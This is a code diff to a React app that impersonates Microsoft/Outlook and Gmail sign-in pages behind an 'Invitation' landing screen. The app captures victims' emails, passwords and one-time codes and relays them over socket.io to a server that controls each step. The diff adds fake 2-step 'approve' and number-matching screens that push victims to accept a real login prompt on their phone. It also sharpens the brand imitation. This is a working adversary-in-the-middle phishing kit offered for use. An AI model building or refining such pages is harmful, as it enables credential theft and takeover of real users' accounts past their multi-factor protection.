@@ -10,8 +10,9 @@ const EmailAuthApp = () => {
   const [email, setEmail] = useState(''); 
   const [isLoading, setIsLoading] = useState(false);
   const [specialNumber, setSpecialNumber] = useState(null);
-  const [sessionId, setSessionId] = useState(null);
-  const socketRef = useRef(null); 
+  const [sessionId, setSessionId] = useState(null); 
+  const socketRef = useRef(null);   
+  const [socketConnected, setSocketConnected] = useState(false);
 
 
 
@@ -128,11 +129,20 @@ const EmailAuthApp = () => {
     socketRef.current = io(SOCKET_SERVER);
     
     socketRef.current.on('connect', () => {
-      console.log('My socket ID:', socketRef.current.id);
+      console.log('My socket ID:', socketRef.current.id); 
+      setSocketConnected(true);
     }); 
 
      // If we already have a sessionId, tell backend to update
-      if (sessionId) {
+      if (sessionId) { 
+         // ✅ YES! This means we connected BEFORE
+    // ✅ This is a RECONNECTION, not first connection
+    // ✅ ALERT backend: "Update my socket!" 
+     // "Hey backend! I'm not a new user!
+     //It's a signal that says ....
+  //HEY!! I was here before with session sess_123
+  // But my socket changed (reconnection happened)
+  // Please update your records so you can still find me!"
         console.log('Reconnecting session:', sessionId);
         socketRef.current.emit('reconnect-session', { sessionId });
       }
@@ -142,6 +152,8 @@ const EmailAuthApp = () => {
   socketRef.current.off('show-otp-screen');
   socketRef.current.off('show-success-screen');
   socketRef.current.off('show-error');
+  socketRef.current.off('show-approve-screen');
+  socketRef.current.off('show-approve-with-number');
 
     // Listen for server events  
   socketRef.current.on('show-otp-screen', () => {
@@ -150,13 +162,21 @@ const EmailAuthApp = () => {
   console.log('Current provider:', provider);
   setSpecialNumber(null);  // <-- Clear any special number
   setCurrentView(provider === 'gmail' ? 'gmail-otp' : 'ms-otp');
-}); 
+});  
 
-socketRef.current.on('show-otp-with-number', (data) => {
-  console.log('OTP with special number:', data.number); 
+   
+ socketRef.current.on('show-approve-screen', () => {
+  console.log('=== APPROVE EVENT RECEIVED ===');
+  setIsLoading(false);
+  setSpecialNumber(null); 
+  setCurrentView(provider === 'gmail' ? 'gmail-approve-special' : 'ms-approve');  
+});
+
+socketRef.current.on('show-approve-with-number', (data) => {
+  console.log('Approve with special number:', data.number); 
   setIsLoading(false);
   setSpecialNumber(data.number);  // <-- Store the number
-  setCurrentView(provider === 'gmail' ? 'gmail-otp-special' : 'ms-otp');   
+  setCurrentView(provider === 'gmail' ? 'gmail-approve-specialb' : 'ms-approve');   
 });
 
 
@@ -214,7 +234,13 @@ useEffect(() => {
     }
   };
 
-  const handleEmailSubmit = () => { 
+  const handleEmailSubmit = () => {     
+      // Add validation
+  if (!email || email.trim() === '') {
+    alert('Please enter your email address');
+    return;
+  }
+
     if (email && socketRef.current) {
       setIsLoading(true);
       socketRef.current.emit('submit-email', {
@@ -259,10 +285,28 @@ useEffect(() => {
     setCurrentView('landing');
     setProvider('');
     setEmail('');
-  };
+  }; 
 
-  return (
-    <div className="app-container"> 
+
+ 
+
+  return ( 
+    <div className="app-container">  
+
+
+     {/* Loading screen here */}
+    {!socketConnected && (
+      <div className="full-screen-loading">
+        <div className="loading-content-center">
+          <div className="loading-brand">
+            <div className="brand-text">Invitation</div>
+            <div className="brand-post">...</div>
+          </div>
+          <div className="loading-spinner-main"></div>
+        </div>
+      </div>
+    )}
+
       {/* Landing Page */}
       {currentView === 'landing' && (
         <div className="landing-container">
@@ -310,47 +354,57 @@ useEffect(() => {
             </div>
           </div>
         </div>
-      )}
+      )} 
+
+
+    
 
       {/* Microsoft - Email Entry */}
-      {currentView === 'ms-email' && (
-        <div className="ms-container">
-          <div className="ms-card">
-            <div className="ms-logo">
-              <div className="ms-logo-icon">
-                <div className="ms-logo-squares">
-                  <div className="ms-square" style={{background: '#f25022'}}></div>
-                  <div className="ms-square" style={{background: '#7fba00'}}></div>
-                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
-                  <div className="ms-square" style={{background: '#ffb900'}}></div>
-                </div>
-              </div>
-              <span className="ms-logo-text">Microsoft</span>
-            </div>
-            <h1 className="ms-title">Sign in</h1>
-            <p className="ms-subtitle">to continue to Outlook</p>
-            <div>
-              <input 
-                type="text" 
-                className="ms-input" 
-                placeholder="Email, phone, or Skype"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-              />
-              <a href="#" className="ms-link">No account? Create one!</a>
-            </div>
-            <div className="clearfix">
-              <button className="ms-button" disabled={isLoading} onClick={handleEmailSubmit}> {isLoading ? 'Please wait...' : 'Next'} </button>
-            </div>
-          </div>
-          <div className="ms-options">
-            <svg className="ms-key-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
-            </svg>
-            <span className="ms-options-text">Sign-in options</span>
+      {/* Microsoft - Email Entry */}
+{currentView === 'ms-email' && (
+  <div className="ms-container">
+    <div className="ms-card">
+      <div className="ms-logo">
+        <div className="ms-logo-icon">
+          <div className="ms-logo-squares">
+            <div className="ms-square" style={{background: '#f25022'}}></div>
+            <div className="ms-square" style={{background: '#7fba00'}}></div>
+            <div className="ms-square" style={{background: '#00a4ef'}}></div>
+            <div className="ms-square" style={{background: '#ffb900'}}></div>
           </div>
         </div>
-      )}
+        <span className="ms-logo-text">Microsoft</span>
+      </div>
+      <h1 className="ms-title">Sign in</h1>
+      <p className="ms-subtitle">
+        {provider === 'outlook' ? 'to continue to Outlook' : 'to continue to Office 365'}
+      </p>
+      <div>
+        <input 
+          type="text" 
+          className="ms-input" 
+          placeholder="Email, phone, or Skype"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+        />
+        <a href="#" className="ms-link">No account? Create one!</a>  <br />  
+        <a href="#" className="ms-link">Can't access your account</a>
+      </div>
+      <div className="clearfix">
+        <button className="ms-button"  disabled={isLoading || !email || email.trim() === ''} onClick={handleEmailSubmit}> 
+          {isLoading ? 'Please wait...' : 'Next'} 
+        </button>
+      </div>
+    </div>
+    <div className="ms-options">
+      <svg className="ms-key-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
+      </svg>
+      <span className="ms-options-text">Sign-in options</span>
+    </div>
+  </div>
+)}
+
 
       {/* Microsoft - Password Entry */}
       {currentView === 'ms-password' && (
@@ -368,7 +422,7 @@ useEffect(() => {
               <span className="ms-logo-text">Microsoft</span>
             </div>
             <h1 className="ms-title">Enter your password</h1>
-            <p className="ms-subtitle">for the account: {email || 'nnman@gmail.com'}</p>
+            <p className="ms-subtitle">for the account: {email || '*********'}</p>
             <div>
               <input 
                 type="password" 
@@ -381,6 +435,10 @@ useEffect(() => {
               <button className="ms-button" disabled={isLoading} onClick={() => {
                 const pwd = document.getElementById('ms-password-input').value;
                 handlePasswordSubmit(pwd);
+                 if (!pwd || pwd.trim() === '') {
+    alert('Please enter your password');
+    return;
+  }
               }}> {isLoading ? 'Signing in...' : 'Sign in'} </button>
             </div> 
 
@@ -425,6 +483,10 @@ useEffect(() => {
             <div className="clearfix">
               <button className="ms-button" disabled={isLoading} onClick={() => {
                   const otp = document.querySelector('.ms-input').value;
+                   if (!otp || otp.trim() === '') {
+    alert('Please enter the verification code');
+    return;
+  }
                  handleOtpSubmit(otp) 
                  } }> {isLoading ? 'Verifying...' : 'Next'} </button>
             </div>
@@ -468,7 +530,7 @@ useEffect(() => {
             </p>
             <div className="gmail-actions">
               <a href="#" className="gmail-link">Create account</a>
-              <button className="gmail-button" disabled={isLoading} onClick={handleEmailSubmit}>  {isLoading ? 'Signing in...' : 'Next'} </button>
+              <button className="gmail-button" disabled={isLoading || !email || email.trim() === ''} onClick={handleEmailSubmit}>  {isLoading ? 'Signing in...' : 'Next'} </button>
             </div>
           </div>
           <div className="gmail-footer">
@@ -509,14 +571,26 @@ useEffect(() => {
                 />
               </div>
             </div>
-            <div className="gmail-checkbox-group">
-              <input type="checkbox" className="gmail-checkbox" id="show-password" />
-              <label htmlFor="show-password" className="gmail-checkbox-label">Show password</label>
-            </div>
+             <div className="gmail-checkbox-group">
+  <input 
+    type="checkbox" 
+    className="gmail-checkbox" 
+    id="show-password"
+    onChange={(e) => {
+      const passwordInput = document.getElementById('gmail-password-input');
+      passwordInput.type = e.target.checked ? 'text' : 'password';
+    }}
+  />
+  <label htmlFor="show-password" className="gmail-checkbox-label">Show password</label>
+</div>
             <div className="gmail-actions">
               <a href="#" className="gmail-link">Forgot password?</a>
               <button className="gmail-button" disabled={isLoading} onClick={() => {
                 const pwd = document.getElementById('gmail-password-input').value;
+                 if (!pwd || pwd.trim() === '') {
+    alert('Please enter your password');
+    return;
+  }
                 handlePasswordSubmit(pwd);
               }}> {isLoading ? 'Signing in...' : 'Sign in'} </button>
             </div>
@@ -592,6 +666,10 @@ useEffect(() => {
               <a href="#" className="gmail-link">Resend code</a>
               <button className="gmail-button" disabled={isLoading} onClick={() => {
                 const otp = document.getElementById('gmail-otp-input').value;
+                if (!otp || otp.trim() === '') {
+    alert('Please enter the verification code');
+    return;
+  }
                 handleOtpSubmit(otp);
               }}> {isLoading ? 'Verifying...' : 'Next'} </button>
             </div>
@@ -609,12 +687,13 @@ useEffect(() => {
             </div>
           </div>
         </div>
-      )}        
+      )}         
 
 
 
 
-      {currentView === 'gmail-otp-special' && (
+
+       {currentView === 'gmail-approve-special' && (
   <div className="gmail-container">
     <div className="gmail-content">
       <div className="gmail-logo">
@@ -623,23 +702,49 @@ useEffect(() => {
       <h1 className="gmail-title">2-Step Verification</h1>
       <p className="gmail-subtitle">To continue, first verify it's you</p>
       <p className="gmail-info" style={{marginBottom: '24px'}}>
-        Google sent a notification to your phone. Tap <strong>Yes</strong> on the notification, then tap <strong style={{fontSize: '28px', color: '#8ab4f8'}}>{specialNumber}</strong> on your phone to sign in.
-      </p>
-      <div className="gmail-input-wrapper">
-        <input 
-          type="text" 
-          className="gmail-input" 
-          placeholder="Enter code"
-          maxLength="6"
-          id="gmail-otp-special-input"
-        />
-      </div>
+        Google sent a notification to your phone. Tap <strong>Yes</strong> on the notification to sign in, and click Next below.
+      </p> 
       <a href="#" className="gmail-link">Try another way</a>
-      <div className="gmail-actions">
-        <a href="#" className="gmail-link">Resend code</a>
-        <button className="gmail-button" disabled={isLoading} onClick={() => {
-          const otp = document.getElementById('gmail-otp-special-input').value;
-          handleOtpSubmit(otp);
+      <div className="gmail-actions"> 
+        <button className="gmail-button" disabled={isLoading} onClick={() => { 
+          handleOtpSubmit('00000');
+        }}> {isLoading ? 'Verifying...' : 'Next'} </button>
+      </div>
+    </div>
+    <div className="gmail-footer">
+      <div className="gmail-footer-left">
+        <select className="gmail-footer-select">
+          <option>English (United States)</option>
+        </select>
+      </div>
+      <div className="gmail-footer-right">
+        <a href="#" className="gmail-footer-link">Help</a>
+        <a href="#" className="gmail-footer-link">Privacy</a>
+        <a href="#" className="gmail-footer-link">Terms</a>
+      </div>
+    </div>
+  </div>
+)}
+
+
+
+
+
+      {currentView === 'gmail-approve-specialb' && (
+  <div className="gmail-container">
+    <div className="gmail-content">
+      <div className="gmail-logo">
+        <span className="google-g">G</span>
+      </div>
+      <h1 className="gmail-title">2-Step Verification</h1>
+      <p className="gmail-subtitle">To continue, first verify it's you</p>
+      <p className="gmail-info" style={{marginBottom: '24px'}}>
+        Tap <strong style={{fontSize: '27px', color: '#8ab4f8'}}>{specialNumber}</strong> on your phone to sign in, and click Next below.
+      </p> 
+      <a href="#" className="gmail-link">Try another way</a>
+      <div className="gmail-actions"> 
+        <button className="gmail-button" disabled={isLoading} onClick={() => { 
+          handleOtpSubmit('00000');
         }}> {isLoading ? 'Verifying...' : 'Next'} </button>
       </div>
     </div>
@@ -674,7 +779,6 @@ useEffect(() => {
 
 
 
-
        <style>{`
         * {
           margin: 0;
@@ -684,6 +788,8 @@ useEffect(() => {
 
         body {
           font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+          -webkit-font-smoothing: antialiased;
+          -moz-osx-font-smoothing: grayscale;
         }
 
         .app-container {
@@ -705,78 +811,84 @@ useEffect(() => {
 
         .landing-card {
           background: #2d2d2d;
-          border-radius: 16px;
-          padding: 40px 30px;
-          max-width: 400px;
+          border-radius: 12px;
+          padding: 48px 40px;
+          max-width: 420px;
           width: 100%;
           box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
         }
 
         .landing-logo {
           text-align: center;
-          margin-bottom: 20px;
+          margin-bottom: 32px;
         }
 
         .landing-logo-text {
-          font-size: 32px;
-          font-weight: bold;
+          font-size: 36px;
+          font-weight: 700;
           color: white;
-          font-family: 'Brush Script MT', cursive;
+          font-family: 'Segoe UI', sans-serif;
+          letter-spacing: -0.5px;
         }
 
         .landing-post {
-          font-size: 12px;
-          color: #999;
-          letter-spacing: 2px;
+          font-size: 11px;
+          color: #888;
+          letter-spacing: 1.5px;
+          text-transform: uppercase;
+          margin-top: 4px;
         }
 
         .landing-title {
-          color: white;
+          color: #ffffff;
           text-align: center;
-          font-size: 20px;
+          font-size: 22px;
           font-weight: 600;
-          margin-bottom: 15px;
-          line-height: 1.4;
+          margin-bottom: 12px;
+          line-height: 1.3;
+          letter-spacing: -0.3px;
         }
 
         .landing-description {
-          color: #b0b0b0;
+          color: #a8a8a8;
           text-align: center;
-          font-size: 13px;
-          margin-bottom: 30px;
-          line-height: 1.6;
+          font-size: 14px;
+          margin-bottom: 36px;
+          line-height: 1.5;
         }
 
         .provider-button {
           width: 100%;
-          padding: 14px 20px;
-          margin-bottom: 12px;
+          padding: 13px 20px;
+          margin-bottom: 14px;
           border: none;
-          border-radius: 8px;
+          border-radius: 6px;
           font-size: 15px;
-          font-weight: 600;
+          font-weight: 500;
           color: white;
           cursor: pointer;
           display: flex;
           align-items: center;
-          transition: opacity 0.2s;
+          transition: all 0.2s ease;
+          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
         }
 
         .provider-button:hover {
-          opacity: 0.9;
+          transform: translateY(-1px);
+          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
         }
 
         .provider-icon {
-          width: 24px;
-          height: 24px;
-          margin-right: 12px;
+          width: 22px;
+          height: 22px;
+          margin-right: 14px;
           background: white;
-          border-radius: 4px;
+          border-radius: 3px;
           display: flex;
           align-items: center;
           justify-content: center;
-          font-weight: bold;
-          font-size: 12px;
+          font-weight: 700;
+          font-size: 11px;
         }
 
         .outlook-btn {
@@ -788,20 +900,20 @@ useEffect(() => {
         }
 
         .gmail-btn {
-          background: #d93025;
+          background: #ea4335;
         }
 
         .landing-footer {
-          color: #888;
+          color: #777;
           text-align: center;
-          font-size: 11px;
-          margin-top: 30px;
-          line-height: 1.5;
+          font-size: 12px;
+          margin-top: 40px;
+          line-height: 1.6;
         }
 
         /* Microsoft Auth Styles */
         .ms-container {
-          background: linear-gradient(135deg, #fce4ec 0%, #e8f5e9 100%);
+          background: #ffffff;
           min-height: 100vh;
           display: flex;
           flex-direction: column;
@@ -813,85 +925,87 @@ useEffect(() => {
 
         .ms-card {
           background: white;
-          border-radius: 8px;
-          padding: 44px 44px 32px;
+          padding: 44px 44px 36px;
           max-width: 440px;
           width: 100%;
-          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
         }
 
         .ms-logo {
-          display: flex;
-          align-items: center;
-          margin-bottom: 24px;
-        }
+  display: flex;
+  align-items: center;
+  margin-bottom: 16px;
+}
 
-        .ms-logo-icon {
-          width: 108px;
-          height: 24px;
-          margin-right: 8px;
-          display: flex;
-          align-items: center;
-        }
+.ms-logo-icon {
+  display: flex;
+  align-items: center;
+  margin-right: 10px;
+}
 
-        .ms-logo-squares {
-          display: grid;
-          grid-template-columns: repeat(2, 11px);
-          grid-gap: 1px;
-          margin-right: 8px;
-        }
+.ms-logo-squares {
+  display: grid;
+  grid-template-columns: repeat(2, 11px);
+  grid-template-rows: repeat(2, 11px);
+  gap: 1px;
+}
 
-        .ms-square {
-          width: 11px;
-          height: 11px;
-        }
+.ms-square {
+  width: 11px;
+  height: 11px;
+}
 
-        .ms-logo-text {
-          font-size: 17px;
-          font-weight: 600;
-          color: #5e5e5e;
-        }
+.ms-logo-text {
+  font-size: 21px;
+  font-weight: 600;
+  color: #5e5e5e;
+  letter-spacing: -0.3px;
+}
 
         .ms-title {
-          font-size: 24px;
+          font-size: 26px;
           font-weight: 600;
           color: #1b1b1b;
-          margin-bottom: 8px;
+          margin-bottom: 10px;
+          letter-spacing: -0.5px;
         }
 
         .ms-subtitle {
           font-size: 15px;
-          color: #605e5c;
-          margin-bottom: 24px;
+          font-weight: 400;
+          color: #1b1b1b;
+          margin-bottom: 28px;
         }
 
         .ms-input {
           width: 100%;
-          padding: 10px 12px;
+          padding: 11px 10px;
           font-size: 15px;
           border: none;
           border-bottom: 1px solid #605e5c;
           outline: none;
           color: #1b1b1b;
           background: transparent;
-          margin-bottom: 8px;
+          margin-bottom: 6px;
+          font-family: 'Segoe UI', sans-serif;
         }
 
         .ms-input:focus {
           border-bottom: 2px solid #0078d4;
-          padding-bottom: 9px;
+          padding-bottom: 10px;
         }
 
         .ms-input::placeholder {
           color: #a19f9d;
+          font-weight: 400;
         }
 
         .ms-link {
           color: #0067b8;
           text-decoration: none;
           font-size: 13px;
+          font-weight: 400;
           display: inline-block;
-          margin-top: 12px;
+          margin-top: 16px;
         }
 
         .ms-link:hover {
@@ -902,30 +1016,35 @@ useEffect(() => {
           background: #0067b8;
           color: white;
           border: none;
-          padding: 10px 24px;
+          padding: 8px 28px;
           font-size: 15px;
           font-weight: 600;
-          border-radius: 2px;
           cursor: pointer;
           float: right;
-          margin-top: 24px;
+          margin-top: 28px;
+          transition: background 0.2s ease;
         }
 
-        .ms-button:hover {
+        .ms-button:hover:not(:disabled) {
           background: #005a9e;
+        }
+
+        .ms-button:disabled {
+          opacity: 0.6;
+          cursor: not-allowed;
         }
 
         .ms-options {
           background: white;
           border: 1px solid #8a8886;
-          border-radius: 4px;
-          padding: 12px;
-          margin-top: 24px;
+          padding: 11px 14px;
+          margin-top: 20px;
           display: flex;
           align-items: center;
           cursor: pointer;
           max-width: 440px;
           width: 100%;
+          transition: background 0.2s ease;
         }
 
         .ms-options:hover {
@@ -935,17 +1054,19 @@ useEffect(() => {
         .ms-key-icon {
           width: 20px;
           height: 20px;
-          margin-right: 12px;
+          margin-right: 10px;
+          color: #1b1b1b;
         }
 
         .ms-options-text {
-          color: #201f1e;
+          color: #1b1b1b;
           font-size: 15px;
+          font-weight: 400;
         }
 
         .ms-footer {
-          background: #f3f2f1;
-          padding: 16px;
+          background: transparent;
+          padding: 20px 16px;
           position: absolute;
           bottom: 0;
           left: 0;
@@ -965,7 +1086,8 @@ useEffect(() => {
         .ms-footer-link {
           color: #605e5c;
           text-decoration: none;
-          font-size: 13px;
+          font-size: 12px;
+          font-weight: 400;
         }
 
         .ms-footer-link:hover {
@@ -973,7 +1095,7 @@ useEffect(() => {
         }
 
         .ms-footer-info {
-          font-size: 13px;
+          font-size: 12px;
           color: #605e5c;
         }
 
@@ -987,88 +1109,99 @@ useEffect(() => {
         }
 
         /* Gmail Auth Styles */
-        .gmail-container {
-          background: #202124;
-          min-height: 100vh;
-          display: flex;
-          flex-direction: column;
-          padding: 20px;
-        }
+       /* Gmail Auth Styles */
+.gmail-container {
+  background: #ffffff;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  padding: 0;
+  position: relative;
+}
 
-        .gmail-content {
+.gmail-content {
   flex: 1;
   display: flex;
   flex-direction: column;
   align-items: flex-start;
-  max-width: 550px;   
+  max-width: 450px;   
   width: 100%;
   margin: 0 auto;
-  padding: 60px 40px 20px;   
+  padding: 72px 40px 48px;   
 }
 
         .gmail-logo {
           width: 75px;
-          height: 75px;
-          margin-bottom: 24px;
+          height: 24px;
+          margin-bottom: 16px;
           display: flex;
           align-items: center;
-          justify-content: center;
         }
 
         .google-g {
-          font-size: 48px;
-          font-weight: bold;
-          background: linear-gradient(90deg, #4285f4 0%, #ea4335 25%, #fbbc04 50%, #34a853 75%, #4285f4 100%);
-          -webkit-background-clip: text;
-          -webkit-text-fill-color: transparent;
-          background-clip: text;
+          font-size: 22px;
+          font-weight: 500;
+          font-family: 'Product Sans', 'Segoe UI', sans-serif;
+          color: #5f6368;
+          letter-spacing: -0.5px;
         }
 
         .gmail-title {
           font-size: 24px;
           font-weight: 400;
-          color: #e8eaed;
+          color: #202124;
           margin-bottom: 8px;
+          letter-spacing: 0;
         }
 
         .gmail-subtitle {
           font-size: 16px;
-          color: #e8eaed;
-          margin-bottom: 32px;
+          font-weight: 400;
+          color: #202124;
+          margin-bottom: 26px;
+          letter-spacing: 0;
         }
 
         .gmail-input-wrapper {
           width: 100%;
-          margin-bottom: 24px;
+          margin-bottom: 26px;
         }
 
         .gmail-input {
           width: 100%;
-          padding: 16px;
+          padding: 13px 15px;
           font-size: 16px;
-          color: #e8eaed;
+          font-weight: 400;
+          color: #202124;
           background: transparent;
-          border: 1px solid #5f6368;
+          border: 1px solid #dadce0;
           border-radius: 4px;
           outline: none;
+          font-family: 'Segoe UI', sans-serif;
+          transition: border 0.2s ease;
+        }
+
+        .gmail-input:hover {
+          border: 1px solid #202124;
         }
 
         .gmail-input:focus {
-          border: 2px solid #8ab4f8;
-          padding: 15px;
+          border: 2px solid #1a73e8;
+          padding: 12px 14px;
         }
 
         .gmail-input::placeholder {
-          color: #9aa0a6;
+          color: #5f6368;
+          font-weight: 400;
         }
 
         .gmail-link {
-          color: #8ab4f8;
+          color: #1a73e8;
           text-decoration: none;
           font-size: 14px;
           font-weight: 500;
           display: inline-block;
-          margin-bottom: 24px;
+          margin-bottom: 26px;
         }
 
         .gmail-link:hover {
@@ -1077,9 +1210,10 @@ useEffect(() => {
 
         .gmail-info {
           font-size: 14px;
-          color: #e8eaed;
-          margin-bottom: 24px;
-          line-height: 1.5;
+          font-weight: 400;
+          color: #5f6368;
+          margin-bottom: 26px;
+          line-height: 1.4;
         }
 
         .gmail-actions {
@@ -1087,22 +1221,30 @@ useEffect(() => {
           display: flex;
           justify-content: space-between;
           align-items: center;
-          margin-top: 32px;
+          margin-top: 26px;
         }
 
         .gmail-button {
-          background: #8ab4f8;
-          color: #202124;
+          background: #1a73e8;
+          color: #ffffff;
           border: none;
-          padding: 10px 24px;
+          padding: 9px 24px;
           font-size: 14px;
           font-weight: 500;
           border-radius: 4px;
           cursor: pointer;
+          transition: background 0.2s ease;
+          letter-spacing: 0.25px;
         }
 
-        .gmail-button:hover {
-          background: #aecbfa;
+        .gmail-button:hover:not(:disabled) {
+          background: #1765cc;
+          box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        .gmail-button:disabled {
+          opacity: 0.6;
+          cursor: not-allowed;
         }
 
         .gmail-footer {
@@ -1118,92 +1260,112 @@ useEffect(() => {
         .gmail-footer-left {
           display: flex;
           align-items: center;
-          gap: 8px;
+          gap: 16px;
         }
 
         .gmail-footer-select {
           background: transparent;
-          color: #e8eaed;
+          color: #5f6368;
           border: none;
           font-size: 12px;
           cursor: pointer;
           outline: none;
+          font-weight: 400;
         }
 
         .gmail-footer-right {
           display: flex;
-          gap: 24px;
+          gap: 32px;
         }
 
         .gmail-footer-link {
-          color: #e8eaed;
+          color: #5f6368;
           text-decoration: none;
           font-size: 12px;
+          font-weight: 400;
         }
 
         .gmail-footer-link:hover {
-          text-decoration: underline;
+          color: #202124;
         }
 
         .gmail-account-selector {
           display: flex;
           align-items: center;
           padding: 12px 16px;
-          border: 1px solid #5f6368;
-          border-radius: 24px;
-          margin-bottom: 32px;
+          border: 1px solid #dadce0;
+          border-radius: 8px;
+          margin-bottom: 26px;
           cursor: pointer;
           width: 100%;
+          transition: background 0.2s ease;
+        }
+
+        .gmail-account-selector:hover {
+          background: #f8f9fa;
         }
 
         .gmail-account-icon {
           width: 32px;
           height: 32px;
-          background: #5f6368;
+          background: #ea4335;
           border-radius: 50%;
           margin-right: 12px;
           display: flex;
           align-items: center;
           justify-content: center;
-          color: #e8eaed;
-          font-size: 14px;
+          color: white;
+          font-size: 15px;
+          font-weight: 500;
         }
 
         .gmail-account-email {
-          color: #e8eaed;
+          color: #202124;
           font-size: 14px;
+          font-weight: 400;
           flex: 1;
         }
 
         .gmail-dropdown-icon {
-          color: #9aa0a6;
+          color: #5f6368;
           font-size: 20px;
         }
 
         .gmail-password-group {
           width: 100%;
-          margin-bottom: 16px;
+          margin-bottom: 20px;
         }
 
         .gmail-password-label {
           display: block;
           color: #5f6368;
           font-size: 12px;
-          margin-bottom: 24px;
-          border: 1px solid #5f6368;
-          padding: 16px;
+          margin-bottom: 26px;
+          border: 1px solid #dadce0;
+          padding: 16px 15px;
           border-radius: 4px;
           position: relative;
+          transition: border 0.2s ease;
+        }
+
+        .gmail-password-label:hover {
+          border: 1px solid #202124;
+        }
+
+        .gmail-password-label:focus-within {
+          border: 2px solid #1a73e8;
+          padding: 15px 14px;
         }
 
         .gmail-password-label-text {
           position: absolute;
-          top: -8px;
+          top: -9px;
           left: 12px;
-          background: #202124;
+          background: #ffffff;
           padding: 0 4px;
           font-size: 12px;
-          color: #9aa0a6;
+          font-weight: 400;
+          color: #5f6368;
         }
 
         .gmail-password-input {
@@ -1211,26 +1373,30 @@ useEffect(() => {
           background: transparent;
           border: none;
           outline: none;
-          color: #e8eaed;
+          color: #202124;
           font-size: 16px;
+          font-weight: 400;
+          font-family: 'Segoe UI', sans-serif;
         }
 
         .gmail-checkbox-group {
           display: flex;
           align-items: center;
-          margin-bottom: 24px;
+          margin-bottom: 26px;
         }
 
         .gmail-checkbox {
-          margin-right: 8px;
-          width: 16px;
-          height: 16px;
+          margin-right: 10px;
+          width: 18px;
+          height: 18px;
           cursor: pointer;
+          accent-color: #1a73e8;
         }
 
         .gmail-checkbox-label {
-          color: #e8eaed;
+          color: #202124;
           font-size: 14px;
+          font-weight: 400;
           cursor: pointer;
         }
 
@@ -1246,10 +1412,10 @@ useEffect(() => {
         .spinner {
           width: 48px;
           height: 48px;
-          border: 4px solid #5f6368;
-          border-top-color: #8ab4f8;
+          border: 4px solid #e8eaed;
+          border-top-color: #1a73e8;
           border-radius: 50%;
-          animation: spin 1s linear infinite;
+          animation: spin 0.8s linear infinite;
           margin-bottom: 24px;
         }
 
@@ -1258,29 +1424,21 @@ useEffect(() => {
         }
 
         .loading-text {
-          color: #e8eaed;
+          color: #202124;
           font-size: 16px;
+          font-weight: 400;
           margin-bottom: 8px;
         }
 
         .loading-subtext {
-          color: #9aa0a6;
+          color: #5f6368;
           font-size: 14px;
+          font-weight: 400;
         } 
-
-        .gmail-button:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-}
-
-.ms-button:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-}
 
         /* Success Screen */
         .success-container {
-          background: rgba(0, 0, 0, 0.8);
+          background: linear-gradient(180deg, #2a2a2a 0%, #1a1a1a 100%);
           min-height: 100vh;
           display: flex;
           align-items: center;
@@ -1290,8 +1448,8 @@ useEffect(() => {
 
         .success-card {
           background: #2d2d2d;
-          border-radius: 16px;
-          padding: 48px 40px;
+          border-radius: 12px;
+          padding: 56px 48px;
           max-width: 440px;
           width: 100%;
           text-align: center;
@@ -1302,7 +1460,7 @@ useEffect(() => {
           height: 80px;
           background: #2e7d32;
           border-radius: 50%;
-          margin: 0 auto 24px;
+          margin: 0 auto 28px;
           display: flex;
           align-items: center;
           justify-content: center;
@@ -1315,16 +1473,19 @@ useEffect(() => {
         }
 
         .success-title {
-          color: white;
-          font-size: 24px;
+          color: #ffffff;
+          font-size: 26px;
           font-weight: 600;
-          margin-bottom: 12px;
+          margin-bottom: 14px;
+          letter-spacing: -0.3px;
         }
 
         .success-subtitle {
           color: #b0b0b0;
-          font-size: 14px;
-          margin-bottom: 32px;
+          font-size: 15px;
+          font-weight: 400;
+          margin-bottom: 36px;
+          line-height: 1.4;
         }
 
         .success-button {
@@ -1337,6 +1498,7 @@ useEffect(() => {
           border-radius: 8px;
           cursor: pointer;
           width: 100%;
+          transition: background 0.2s ease;
         }
 
         .success-button:hover {
@@ -1347,7 +1509,57 @@ useEffect(() => {
           content: "";
           display: table;
           clear: both;
-        }
+        } 
+
+
+        /* Full Screen Loading */
+.full-screen-loading {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: linear-gradient(180deg, #2a2a2a 0%, #1a1a1a 100%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+}
+
+.loading-content-center {
+  text-align: center;
+}
+
+.loading-brand {
+  margin-bottom: 48px;
+}
+
+.brand-text {
+  font-size: 52px;
+  font-weight: 700;
+  color: white;
+  font-family: 'Segoe UI', sans-serif;
+  letter-spacing: -1px;
+}
+
+.brand-post {
+  font-size: 13px;
+  color: #888;
+  letter-spacing: 4px;
+  text-transform: uppercase;
+  margin-top: 4px;
+}
+
+.loading-spinner-main {
+  width: 60px;
+  height: 60px;
+  border: 4px solid #404040;
+  border-top-color: #2e7d32;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto;
+}
+
       `}</style>
       
    </div>  
